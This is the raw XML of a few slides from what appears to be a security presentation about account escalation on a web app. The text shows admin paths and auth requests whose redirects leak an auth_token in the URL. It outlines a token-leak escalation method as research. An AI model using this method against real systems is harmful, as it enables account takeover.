                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CTRL+U -&gt; admin.site.com/admin/users </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CTRL+A -&gt; admin.site.com/admin/acitivity </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CTRL+S -&gt; admin.site.com/admin/settings</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CTRL+D -&gt; docs.site.com/docs/</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CTRL+N -&gt; docs.site.com/news </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Redirects back to app.prisonsystem.com </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7532550" y="2151250"/>
            <a:ext cx="3000000" cy="400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t/>
            </a:r>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="301" name="Shape 301"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;303;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2616600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-419100" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Javascript leaks:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-419100" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>GET /api/v1/backend/auth?url=docs/index</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="6AA84F"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>302 -&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="4572000" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>docs.site.com/docs</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>GET /api/v1/backend/auth?url=docs/x/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="6AA84F"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>302 -&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="3200400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>docs.site.com/x/?auth_token=[TOKEN]</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="310" name="Shape 310"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;312;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313" name="Google Shape;313;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="314" name="Google Shape;314;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="32631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0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="20000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>🤔</a:t>
            </a:r>
            <a:endParaRPr sz="20000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="315" name="Google Shape;315;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="319" name="Shape 319"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="320" name="Google Shape;320;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;321;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Google Shape;322;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="Google Shape;323;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="324" name="Google Shape;324;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2616600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>admin.site.com/?auth_token=[TOKEN] -&gt; app.site.com 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
